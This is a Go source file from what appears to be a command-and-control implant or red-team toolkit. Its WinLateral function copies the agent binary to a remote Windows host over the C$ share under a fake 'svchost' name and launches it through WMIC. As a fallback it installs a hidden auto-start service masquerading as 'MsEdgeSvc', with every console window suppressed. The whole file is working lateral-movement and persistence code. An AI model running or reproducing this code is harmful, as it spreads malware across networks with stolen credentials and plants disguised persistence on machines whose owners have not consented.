package ttp

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

// WinLateral attempts to copy and execute the agent on a remote Windows host via SMB+WMI.
// params: "targetIP [domain\user:password]"
// Returns a report of what succeeded and what failed.
func WinLateral(params string) (string, error) {
	if params == "" {
		return "", fmt.Errorf("params required: targetIP [domain\\user:password]")
	}

	fields := strings.Fields(params)
	target := fields[0]

	user, password := "", ""
	if len(fields) >= 2 {
		// parse domain\user:password or user:password
		cred := fields[1]
		if idx := strings.LastIndex(cred, ":"); idx >= 0 {
			user = cred[:idx]
			password = cred[idx+1:]
		}
	}

	exe, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("executable: %w", err)
	}

	remoteName := fmt.Sprintf("svchost%04x.exe", rand.Intn(0xFFFF))
	remoteUNC := fmt.Sprintf(`\\%s\C$\Windows\Temp\%s`, target, remoteName)
	remotePath := fmt.Sprintf(`C:\Windows\Temp\%s`, remoteName)

	var sb strings.Builder

	// Step 1: establish SMB session
	if err := smbConnect(target, user, password); err != nil {
		sb.WriteString(fmt.Sprintf("[lateral:smb_connect:err] %v\n", err))
	} else {
		sb.WriteString(fmt.Sprintf("[lateral:smb_connect:ok] %s\n", target))
	}

	// Step 2: copy binary over Admin$ share
	copyCmd := exec.Command("cmd", "/C",
		fmt.Sprintf(`copy /Y "%s" "%s"`, exe, remoteUNC))
	copyCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if out, err := copyCmd.CombinedOutput(); err != nil {
		sb.WriteString(fmt.Sprintf("[lateral:smb_copy:err] %s\n", strings.TrimSpace(string(out))))
	} else {
		sb.WriteString(fmt.Sprintf("[lateral:smb_copy:ok] -> %s\n", remoteUNC))
	}

	// Step 3a: WMIC remote process creation
	var wmicArgs []string
	if user != "" {
		wmicArgs = []string{"/node:" + target, "/user:" + user, "/password:" + password,
			"process", "call", "create",
			fmt.Sprintf(`cmd /c start /b "%s"`, remotePath)}
	} else {
		wmicArgs = []string{"/node:" + target, "process", "call", "create",
			fmt.Sprintf(`cmd /c start /b "%s"`, remotePath)}
	}
	wmicCmd := exec.Command("wmic", wmicArgs...)
	wmicCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if out, err := wmicCmd.CombinedOutput(); err != nil {
		sb.WriteString(fmt.Sprintf("[lateral:wmic:err] %s\n", strings.TrimSpace(string(out))))
		// Step 3b: sc.exe fallback
		svcName := "MsEdgeSvc"
		scCreate := exec.Command("sc", `\\`+target, "create", svcName,
			"binpath=", remotePath, "start=", "auto")
		scCreate.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if out2, err2 := scCreate.CombinedOutput(); err2 != nil {
			sb.WriteString(fmt.Sprintf("[lateral:sc_create:err] %s\n", strings.TrimSpace(string(out2))))
		} else {
			sb.WriteString(fmt.Sprintf("[lateral:sc_create:ok] service %s on %s\n", svcName, target))
			scStart := exec.Command("sc", `\\`+target, "start", svcName)
			scStart.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out3, _ := scStart.CombinedOutput()
			sb.WriteString(fmt.Sprintf("[lateral:sc_start] %s\n", strings.TrimSpace(string(out3))))
		}
	} else {
		sb.WriteString(fmt.Sprintf("[lateral:wmic:ok] %s deployed on %s\n", remoteName, target))
	}

	// Step 4: disconnect SMB session
	exec.Command("net", "use", `\\`+target+`\C$`, "/delete", "/y").Run()

	return sb.String(), nil
}

// smbConnect establishes a net use session to the target Admin$ share.
func smbConnect(target, user, password string) error {
	var args []string
	share := `\\` + target + `\C$`
	if user != "" {
		args = []string{"use", share, password, "/user:" + user, "/persistent:no"}
	} else {
		args = []string{"use", share, "", `/user:""`}
	}
	cmd := exec.Command("net", args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}
